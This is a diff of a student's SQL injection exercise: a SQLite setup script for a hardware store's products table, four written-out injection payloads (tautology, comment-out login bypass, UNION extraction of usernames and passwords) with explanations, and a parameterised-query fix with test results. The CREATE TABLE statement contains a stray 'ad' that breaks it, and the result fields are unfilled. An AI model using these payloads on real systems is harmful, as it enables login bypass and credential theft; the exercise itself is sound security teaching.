@@ -1,4 +1,100 @@
  Name: Gumoshabe Angel
  Students ID: N/A
- Email: gumushobeangel@gmail.com
  Date: 22nd of April 2026
+
+
+import sqlite3
+
+conn = sqlite3.connect('nyondo_stock.db')
+
+conn.execute('''
+CREATE TABLE IF NOT EXISTS products (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    name TEXT NOT NULL,ad
+    description TEXT,
+    price REAL NOT NULL
+)
+''')
+
+conn.executemany(
+    'INSERT INTO products (name, description, price) VALUES (?, ?, ?)',
+    [
+        ('Cement (bag)', 'Portland cement 50kg bag', 35000),
+        ('Iron Sheet 3m', 'Gauge 30 roofing sheet 3m long', 110000),
+        ('Paint 5L', 'Exterior wall paint white 5L', 60000),
+        ('Nails 1kg', 'Common wire nails 1kg pack', 12000),
+        ('Timber 2x4', 'Pine timber plank 2x4 per metre', 25000),
+    ]
+)
+
+conn.commit()
+
+rows = conn.execute('SELECT * FROM products').fetchall()
+for r in rows:
+    print(r)
+
+TASK 3 - ATTACKS
+
+Attack 1
+Payload: search_product("' OR 1=1--")
+
+Query: SELECT * FROM products WHERE name LIKE '%' OR 1=1--%'
+
+Result: (paste what your terminal showed here)
+
+Why it worked:
+OR 1=1 is always true, so the database ignored the search name
+and returned every product in the table.
+
+----------
+
+Attack 2
+Payload: login("admin'--", "anything")
+
+Query: SELECT * FROM users WHERE username='admin'--' AND password='anything'
+
+Result: (paste what your terminal showed here)
+
+Why it worked:
+The -- cut off the password check. The database only checked
+the username, so anyone could log in as admin.
+
+
+
+Attack 3
+Payload: login("' OR '1'='1", "' OR '1'='1")
+
+Query: SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'
+
+Result: (paste what your terminal showed here)
+
+Why it worked:
+'1'='1' is always true, so the login passed with no real
+username or password and returned the first user.
+
+
+
+Attack 4
+Payload: search_product("' UNION SELECT id, username, password, role FROM users--")
+
+Query: SELECT * FROM products WHERE name LIKE '%' UNION SELECT id, username, password, role FROM users--%'
+
+Result: (paste what your terminal showed here)
+
+Why it worked:
+UNION added a second query onto the first one. So the product
+search also pulled out all usernames and passwords from the
+users table.
+
+TASK 4 - FIX
+
+
+The fix is using ? instead of f-strings in the query.
+
+When you use ?, SQLite treats whatever the user types as plain
+text, not as SQL code. So even if someone types ' OR 1=1--,
+the database reads it as just a name to search for, not a command.
+
+Test 1: []    (attack did not work)
+Test 2: []    (attack did not work)
+Test 3: None  (attack did not work)
